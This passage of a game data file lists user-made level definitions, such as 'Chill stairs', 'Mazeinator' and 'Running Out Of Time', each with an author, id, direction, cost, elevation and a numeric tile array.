14,0,0,0,0,0,0,2,9,89,9,9,9,10,11,12,13,14,14,14,14,0,0,0,0,0,0,9,9,9,9,9,9,10,11,12,13,14,14,14,14,0,0,0,0,0,0,20,20,20,19,18,17,16,15,14,14,14,14,14,14,0,67,67,92,67,67,20,20,20,20,20,20,20,20,20,20,54,20,20,54,20,20,20,20,20,20,20,93,20,20,20,20,20,20,20,20,54,20,20,54,20,20,20,20,20,20,20,94,20,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,20,20,20,0,0,0,0,0,0,0,14,93,94,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0]});
maps.push({name="Chill stairs",author="fantasy",id="#1656353420",direction="forward",cost=323,elevation=19,map=[0,0,0,0,0,0,1,1,0,2,2,0,0,67,0,0,67,5,1,0,0,0,0,0,0,1,1,24,0,5,5,0,67,19,67,0,0,67,5,1,0,0,0,0,1,1,24,77,0,5,5,0,0,67,0,0,0,67,5,1,0,0,0,1,1,24,77,0,0,6,6,0,0,0,0,0,0,67,5,1,0,0,1,1,24,77,0,0,0,6,7,7,8,8,9,9,0,67,5,1,0,1,1,24,77,0,0,0,0,6,7,7,8,8,9,9,0,67,5,1,1,1,24,77,0,77,0,0,0,0,0,0,0,0,10,10,0,67,5,1,1,24,77,0,77,19,77,0,0,0,0,0,0,0,10,10,0,67,5,1,1,24,77,0,0,77,0,0,14,14,13,13,12,12,11,11,0,67,5,1,1,24,77,0,0,0,0,0,14,14,13,13,12,12,11,11,0,67,5,1,1,24,77,0,0,0,0,0,15,15,0,0,0,0,0,0,0,67,5,1,1,24,77,0,0,77,0,0,15,15,0,0,0,0,0,0,0,67,5,1,1,24,77,0,77,19,77,0,16,16,17,17,18,18,19,19,0,67,5,1,1,1,24,77,0,77,0,0,16,16,17,17,18,18,19,19,0,67,5,1,0,1,1,24,77,0,0,0,0,0,0,0,0,0,20,20,0,67,5,1,0,0,1,1,24,77,0,0,0,0,0,0,0,0,20,20,0,67,5,1,0,0,0,1,1,24,77,0,0,23,23,23,22,22,21,21,0,67,5,1,0,0,0,0,1,1,24,77,0,23,23,23,22,22,21,21,0,67,5,1,0,0,0,0,0,1,1,24,0,24,24,0,0,0,0,0,0,67,5,1,0,0,0,0,0,0,1,1,0,2,2,0,0,0,0,0,67,5,1,0]});
maps.push({name="Lavavaa",author="tilgep",id="#1656779854",direction="forward",cost=493,elevation=-5,map=[0,0,0,0,0,0,0,0,0,0,18,2,2,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,18,18,18,18,18,18,0,0,0,0,0,0,0,16,16,16,0,0,16,17,17,17,18,18,18,18,0,0,0,0,0,0,16,16,16,16,16,16,16,16,16,16,19,19,19,19,0,0,0,0,0,0,77,76,76,76,76,76,76,16,16,16,19,19,19,19,19,0,0,0,0,0,77,76,76,76,76,78,76,76,76,76,20,20,20,20,20,0,0,0,0,0,16,16,76,76,76,76,76,76,76,76,77,76,76,20,20,20,0,0,0,0,16,16,16,76,76,76,78,76,78,76,77,76,76,76,20,20,0,0,0,0,16,16,76,76,76,76,76,76,76,76,77,76,78,76,76,20,0,0,0,0,77,76,78,76,76,78,76,76,76,78,77,76,76,76,76,20,0,0,0,0,77,76,76,76,76,76,76,76,76,76,77,76,76,76,76,20,0,0,0,0,16,76,76,80,80,80,80,76,76,76,77,78,76,76,76,20,0,0,0,0,16,16,80,80,80,16,80,76,78,76,77,76,76,76,80,20,0,0,0,0,0,16,16,16,16,16,16,76,76,76,77,76,76,80,20,20,0,0,0,0,0,0,14,14,14,14,16,16,16,16,20,20,20,20,20,0,0,0,0,0,0,0,14,14,14,14,16,16,135,135,20,20,20,0,0,0,0,0,0,0,0,0,13,13,13,13,16,16,135,135,20,20,0,0,0,0,0,0,0,0,13,13,13,13,13,13,16,16,135,135,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,13,2,2,13,135,135,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="This One",author="tilgep",id="#1657224114",direction="forward",cost=173,elevation=-2,map=[0,0,0,0,17,2,2,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,0,17,17,17,17,17,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,17,17,17,17,17,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,17,17,17,17,17,17,0,0,0,0,0,0,0,17,17,17,0,1,1,1,0,17,17,17,17,17,0,0,0,0,0,0,0,17,17,17,0,1,0,1,0,17,17,17,17,17,0,0,0,0,0,0,0,17,17,17,0,1,0,1,0,0,17,17,17,17,0,0,0,0,0,0,0,16,16,16,0,1,1,1,0,0,0,16,16,16,0,0,0,0,0,0,0,16,16,16,16,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,16,16,16,16,16,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,15,15,15,15,15,15,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,2,2,15,15,0,0,0,0,0,0,0,0]});
maps.push({name="That One",author="tilgep",id="#1657224830",direction="right",cost=177,elevation=0,map=[0,0,0,0,23,2,2,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,23,0,0,0,0,23,23,23,23,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,23,23,23,23,23,0,0,0,0,0,0,0,0,23,23,23,23,0,0,0,23,23,23,23,23,0,0,0,0,0,0,0,23,23,23,23,2,0,0,23,23,23,23,23,0,1,1,1,0,0,0,23,23,23,23,23,2,0,0,23,23,23,23,0,0,1,0,1,0,0,0,23,23,23,23,23,23,0,23,23,23,23,23,0,0,1,0,1,0,0,23,23,23,23,23,23,23,0,23,23,23,23,0,0,0,1,0,1,0,0,23,23,23,23,23,23,0,0,23,23,23,23,23,0,0,1,1,1,0,23,23,23,23,23,23,23,0,0,23,23,23,23,23,0,0,0,0,0,0,23,23,23,23,0,0,0,0,0,23,23,23,23,23,23,0,0,0,23,23,23,23,23,0,0,0,0,0,0,23,23,23,23,23,23,23,23,23,23,23,23,23,0,0,0,0,0,0,0,23,23,23,23,23,23,23,23,23,23,23,23,23,0,0,0,0,0,0,0,0,23,23,23,23,23,23,23,23,23,23,23,0,0,0,0,0,0,0,0,0,0,23,23,23,23,23,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Verticality",author="xen",id="#1657229266",direction="left",cost=255,elevation=-3,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,24,24,1,1,1,1,1,1,1,1,0,0,0,0,0,102,0,0,0,1,58,58,118,52,52,52,52,96,12,1,0,0,0,0,90,24,90,0,97,118,58,58,118,52,52,52,52,96,12,1,0,0,0,0,24,24,24,0,0,1,58,58,1,112,112,1,1,1,1,1,0,0,0,0,127,24,24,0,0,1,58,58,1,46,46,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,58,58,1,46,46,106,99,0,0,0,0,0,0,0,0,0,0,0,0,1,58,58,1,46,46,1,1,1,1,1,0,0,0,0,0,95,0,0,0,1,18,18,1,46,46,46,46,6,6,1,0,0,0,0,0,95,0,0,0,1,18,18,1,46,46,46,46,6,6,1,0,0,0,0,90,24,90,0,0,0,0,0,1,106,106,1,1,1,1,1,0,0,0,0,24,24,24,0,0,0,0,0,1,98,98,1,0,0,0,0,0,0,0,0,127,24,24,0,0,0,0,0,1,108,108,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,109,109,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,110,110,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,111,111,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,90,90,1,112,112,1,1,1,1,1,1,1,1,0,0,0,0,0,2,101,21,20,19,53,53,54,55,56,57,58,59,20,21,22,23,24,128,1,2,101,21,20,19,53,53,54,55,56,57,58,59,20,21,22,23,24,128,1,1,1,90,90,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Socrates Gasoline",author="Luffaren",id="#1657580875",direction="forward",cost=188,elevation=-4,map=[0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,1,94,24,24,24,24,24,24,0,0,0,0,0,0,14,14,14,14,14,0,1,1,1,1,1,1,24,24,0,0,0,0,0,0,14,16,16,14,15,16,17,18,19,20,21,22,23,24,0,0,0,0,0,0,14,16,16,14,15,16,17,18,19,20,21,22,23,24,0,0,0,0,0,0,14,14,14,14,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,93,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,0,14,14,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,0,14,14,0,14,14,14,0,0,0,120,120,120,120,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,120,1,1,120,40,95,95,40,20,19,18,17,16,15,14,14,14,0,0,0,120,1,1,120,40,95,95,40,20,19,18,17,16,15,14,14,14,0,0,0,120,2,2,120,0,0,0,0,0,0,0,0,0,0,14,14,14,0]});
maps.push({name="Mazeinator",author="Cuddles",id="#1657591898",direction="left",cost=482,elevation=5,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,112,112,1,1,1,1,1,1,1,1,1,1,1,1,1,1,112,112,112,1,112,112,112,112,112,112,112,1,1,1,1,2,17,76,17,1,112,1,112,1,112,112,1,1,1,1,112,1,1,1,1,2,17,76,17,1,66,1,112,112,112,112,1,1,1,112,112,1,1,1,1,1,1,1,17,1,66,1,1,1,112,112,1,1,1,112,1,1,1,1,1,1,1,1,17,1,66,1,1,1,1,1,1,1,1,76,1,76,76,76,1,1,1,1,17,1,112,1,1,77,112,112,77,1,1,76,1,76,76,76,1,1,1,1,17,1,112,112,112,112,112,112,112,112,112,112,1,17,17,17,1,1,1,1,95,1,1,1,1,95,95,95,95,1,1,1,1,17,1,17,1,1,17,76,17,76,17,1,112,112,66,66,112,112,1,1,1,76,1,76,1,1,17,1,17,1,17,1,112,1,69,69,1,112,1,1,95,17,1,76,1,1,76,17,76,17,76,1,112,1,66,66,1,112,1,1,17,1,90,17,1,1,17,1,17,1,17,1,112,112,112,112,112,112,1,1,17,1,17,17,1,1,17,1,17,1,17,1,1,1,12,12,1,1,1,1,17,1,17,90,1,1,76,17,76,17,76,1,1,1,12,13,14,15,16,17,17,1,17,17,1,1,17,1,17,1,17,17,1,1,1,1,1,1,1,1,1,1,90,17,1,1,17,76,17,76,17,17,90,85,17,90,85,17,85,90,17,95,17,17,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,17,90,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Down",author="tilgep",id="#1657744638",direction="forward",cost=31,elevation=-12,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,0,0,0,0,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,0,0,0,0,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,0,0,0,0,0,0,0,0,0,0,0,0,0,15,0,0,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,10,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trap Run",author="Hichatu",id="#1657805637",direction="forward",cost=80,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,89,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,89,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,89,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,89,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,89,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,89,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,89,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,89,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,89,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0]});
maps.push({name="ze displacements",author="fantasy",id="#1657813647",direction="forward",cost=379,elevation=0,map=[0,0,2,2,0,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,14,14,0,24,24,66,66,66,66,24,14,14,14,14,100,0,0,0,0,14,14,14,14,24,24,67,67,67,67,24,14,14,14,14,14,0,0,0,0,14,15,14,14,14,14,66,66,66,66,24,24,14,18,18,14,14,14,0,14,14,15,15,16,16,14,14,66,66,66,24,14,14,18,18,18,20,14,14,14,15,15,15,15,16,14,14,66,66,66,24,14,17,17,19,18,19,14,14,14,14,14,15,94,15,14,14,14,66,66,24,14,14,17,19,93,19,14,14,14,14,14,13,13,15,14,14,14,66,66,14,14,15,15,20,20,15,14,0,0,14,14,13,13,14,14,14,15,14,14,14,100,15,15,15,15,14,14,0,0,0,14,13,13,14,14,14,15,16,16,16,15,15,14,14,15,14,14,0,0,14,14,15,14,14,11,14,15,16,16,16,15,15,14,16,16,16,14,0,14,14,15,15,15,14,11,11,15,15,16,14,14,14,14,16,16,14,14,0,14,94,15,15,15,14,15,11,11,14,14,24,13,13,16,16,14,14,0,0,14,14,13,15,15,14,15,15,11,12,12,14,13,13,13,12,14,0,0,0,0,14,13,15,14,15,15,15,12,12,12,12,13,14,12,12,14,14,14,0,14,14,13,15,14,14,14,14,14,13,13,13,13,14,12,12,14,14,14,0,14,13,13,12,15,14,14,17,14,14,14,13,14,11,12,12,14,14,0,0,100,14,12,12,15,15,16,17,14,14,14,14,11,11,12,12,100,14,0,0,0,14,14,14,93,15,16,14,14,12,10,10,11,11,11,14,14,14,14,0,0,0,0,14,14,14,14,14,12,12,12,10,10,11,11,14,2,2,14,0]});
maps.push({name="War Trenches",author="fantasy",id="#1657815115",direction="forward",cost=436,elevation=0,map=[66,15,2,2,15,15,14,14,14,14,90,14,66,66,66,66,66,66,66,66,66,14,11,11,14,14,14,90,14,100,14,14,14,14,24,14,14,66,66,66,66,15,10,11,14,14,14,14,14,90,14,14,94,14,24,14,14,66,66,66,66,14,11,11,94,14,14,14,14,15,15,16,16,16,16,16,16,14,14,66,14,15,11,10,15,14,11,11,10,12,90,11,11,11,10,11,11,14,14,14,14,14,11,11,15,14,12,10,11,11,11,11,10,11,11,90,11,16,14,14,14,14,10,12,15,15,12,11,14,14,14,14,14,14,14,11,11,14,100,14,14,15,11,10,12,12,10,11,14,90,14,90,14,15,14,11,12,24,14,24,0,14,11,11,11,10,11,11,14,14,14,14,15,15,14,11,12,24,24,24,0,14,15,15,15,15,14,14,14,14,10,11,11,11,91,11,11,15,14,24,0,100,14,24,24,14,11,14,93,14,11,10,11,11,91,11,11,15,14,24,14,14,14,14,15,14,15,14,14,14,11,11,14,15,14,14,14,90,14,24,14,90,11,11,10,10,10,10,12,11,90,11,14,13,16,16,14,14,24,24,14,15,12,11,10,11,90,11,11,11,11,11,15,90,14,12,14,24,24,24,24,14,11,11,14,14,14,15,14,15,15,24,24,14,14,90,14,14,14,24,14,15,10,11,14,24,14,14,14,14,14,24,24,14,93,14,14,14,14,24,14,14,11,10,11,11,10,10,11,10,10,12,11,11,12,11,12,11,14,24,14,14,11,11,11,11,11,11,11,11,11,12,11,10,11,11,11,11,14,24,24,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,11,11,14,24,24,24,24,24,24,14,90,14,100,12,12,10,10,11,11,14,2,2,14,24]});
maps.push({name="Corner run",author="fantasy",id="#1657815506",direction="right",cost=72,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,2,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Ez split",author="fantasy",id="#1657815672",direction="forward",cost=74,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Luff",author="fantasy",id="#1657816823",direction="forward",cost=91,elevation=17,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,24,24,3,9,9,0,24,9,9,24,0,24,24,44,44,0,24,24,44,100,2,2,3,9,9,0,24,9,9,24,0,24,24,36,0,0,24,24,36,0]});
maps.push({name="A Fiery Heart",author="Niikos",id="#1657829819",direction="forward",cost=371,elevation=2,map=[100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,110,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,105,110,0,0,0,0,0,0,0,111,111,111,111,111,0,0,0,0,0,105,105,110,0,0,0,0,0,0,111,76,76,76,76,76,111,0,0,0,0,105,105,0,0,0,0,0,96,111,76,76,76,76,76,76,76,111,0,0,0,105,105,0,0,0,0,0,96,111,76,76,76,76,76,76,76,76,111,0,0,0,105,111,0,0,0,111,96,111,76,76,76,76,76,76,76,76,76,111,0,0,105,111,0,0,0,111,96,0,111,76,76,76,76,76,76,76,76,76,111,0,105,111,111,111,111,111,96,0,0,111,76,76,76,76,76,76,76,76,76,111,3,111,0,0,0,111,96,0,111,76,76,76,76,76,76,76,76,76,111,0,0,111,0,0,0,111,96,111,76,76,76,76,76,76,76,76,76,111,0,0,0,0,0,0,0,0,96,111,76,76,76,76,76,76,76,76,111,0,0,0,0,0,0,0,0,0,96,111,76,76,76,76,76,76,76,111,0,0,0,0,0,66,0,0,0,0,0,0,111,76,76,76,76,76,111,0,0,0,0,0,0,7,0,0,0,0,0,0,0,111,111,111,111,111,0,0,0,0,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,117,0,0,0,0,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,117,0,0,117,117,117,117,0,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,117,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,117,117,117,117,97]});
maps.push({name="Running Out Of Time",author="Niikos",id="#1657831748",direction="right",cost=260,elevation=-2,map=[2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,40,40,1,0,0,0,0,0,0,0,0,0,0,0,0,1,39,37,1,1,40,40,41,1,0,0,0,0,0,0,0,0,0,0,1,39,39,38,1,1,40,40,41,41,1,0,0,0,0,0,0,0,0,1,40,39,39,38,1,1,40,40,41,41,42,1,0,0,0,0,0,0,1,40,40,39,39,38,1,1,40,40,40,41,41,42,1,0,0,0,0,1,40,40,40,40,39,38,1,1,40,40,40,41,41,42,43,1,0,0,1,0,0,40,40,40,39,38,1,1,40,40,40,41,41,42,42,43,1,1,0,0,0,0,40,40,39,38,1,1,40,40,40,41,41,42,42,43,43,44,0,0,0,0,0,40,39,38,1,1,40,40,40,41,41,42,42,43,43,44,44,44,0,0,0,40,39,38,2,1,40,40,40,41,41,42,42,43,43,44,44,44,0,0,0,40,39,38,2,1,40,40,40,41,41,42,42,43,43,44,0,0,0,0,0,40,39,38,1,1,40,40,40,41,41,42,42,43,1,1,0,0,0,0,40,40,39,38,1,1,40,40,40,41,41,42,43,1,0,0,1,0,0,40,40,40,39,38,1,1,40,40,40,41,41,42,1,0,0,0,0,1,40,40,40,40,39,38,1,1,40,40,41,41,42,1,0,0,0,0,0,0,1,40,40,39,39,38,1,1,40,40,41,41,1,0,0,0,0,0,0,0,0,1,40,39,39,38,1,1,40,40,41,1,0,0,0,0,0,0,0,0,0,0,1,39,39,38,1,1,40,40,1,0,0,0,0,0,0,0,0,0,0,0,0,1,39,37,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1]});
maps.push({name="POV Ur A Furry",author="Niikos",id="#1657834350",direction="forward",cost=285,elevation=-2,map=[2,2,1,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,22,22,1,1,0,0,0,0,0,0,1,40,1,0,0,0,0,0,0,1,97,22,40,40,1,0,0,0,1,1,1,40,40,1,0,0,0,0,0,0,1,40,40,40,40,1,1,1,40,40,40,40,40,40,1,0,0,0,0,0,1,1,40,40,40,1,102,40,40,88,40,40,40,40,1,0,0,0,0,0,0,0,1,40,40,40,1,1,1,88,88,40,40,40,40,1,0,0,0,0,0,0,1,40,40,40,1,65,65,65,88,88,40,40,40,40,1,0,0,0,0,0,1,40,40,40,40,1,0,1,65,88,40,40,40,40,1,0,0,0,0,0,1,40,40,40,40,40,1,1,65,88,40,40,1,40,40,1,0,1,0,0,1,40,40,40,40,98,40,40,40,40,40,40,1,40,40,1,0,1,0,0,1,40,40,40,40,98,40,40,40,40,40,40,1,40,40,1,0,0,0,0,1,40,40,40,40,40,1,1,65,88,40,40,1,40,40,1,0,0,0,0,1,40,40,40,40,1,0,1,65,88,40,40,40,40,1,0,0,0,0,0,1,40,40,40,1,65,65,65,88,88,40,40,40,40,1,0,0,0,0,0,1,40,40,40,1,1,1,88,88,40,40,40,40,1,0,0,0,0,1,1,40,40,40,1,104,40,40,88,40,40,40,40,1,0,0,0,0,0,1,40,40,40,40,1,1,1,40,40,40,40,40,40,1,0,0,0,0,1,99,22,40,40,1,0,0,0,1,1,1,103,40,1,0,0,0,0,0,1,22,22,1,1,0,0,0,0,0,0,1,95,1,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,1,2,2,0,0,0,0,0,0]});
